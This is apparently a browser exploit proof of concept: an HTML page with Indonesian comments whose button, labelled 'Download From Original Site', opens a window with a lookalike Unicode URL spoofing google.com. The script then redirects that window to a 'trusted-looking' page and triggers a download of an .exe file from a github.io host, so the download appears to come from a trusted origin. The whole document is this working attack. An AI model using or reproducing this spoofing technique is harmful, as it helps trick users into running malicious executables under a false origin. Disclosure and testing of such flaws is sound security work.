<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <title>Redirect + Download PoC</title>
    <style>
        .button {
            background-color: #4CAF50;
            border: none;
            color: white;
            padding: 15px 32px;
            text-align: center;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>

<script>
function a() {
    // Step 1: buka halaman downloads
    window.open('𝑃𝑤𝑁:⧸⧸google.com/', 'x');

    // Step 2: redirect ke example.com (trusted-looking page)
    setTimeout(function () {
        window.open('https://example.com', 'x');
    }, 1500);

    // Step 3: trigger download dari origin asli
    setTimeout(function () {
        window.open(
            'https://ecdnts-del.github.io/test-apk/apple.exe',
            '_blank'
        );
    }, 4000);
}
</script>

<center>
    <input
        type="button"
        class="button"
        value="Download From Original Site"
        onclick="a()"
    >
</center>

</body>
</html>
